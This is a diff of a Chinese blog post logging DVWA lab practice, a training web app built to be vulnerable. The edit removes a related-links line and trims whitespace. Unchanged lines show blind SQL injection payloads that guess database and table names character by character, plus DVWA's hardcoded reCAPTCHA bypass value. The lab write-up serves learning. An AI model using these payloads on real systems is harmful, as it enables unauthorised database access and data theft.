@@ -4,8 +4,6 @@ date: 2020-02-09 23:30:13
 categories: Web
 ---
 
-> 相关文章：[DVWA练习记录(一)](/2020/02/05/DVWA_1/)、[DVWA练习记录(二)](/2020/02/07/DVWA_2/)
-
 # SQL Injection(Blind)（SQL盲注）
 
 SQL盲注与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。
@@ -72,7 +70,7 @@ id=1' and ord(substr(database(),1,1))=97#
 //数据库内表的个数
 id=1' and (select count(table_name) from information_schema.tables where table_schema=database())=1#
 //表名逐字符猜解
-id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='a'# 
+id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='a'#
 //表内字段的列数
 id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=1#
 //表名逐字符猜解
@@ -565,7 +563,7 @@ if( isset( $_POST[ 'Change' ] ) ) {
     );
 
     if (
-        $resp || 
+        $resp ||
         (
             $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'
             && $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
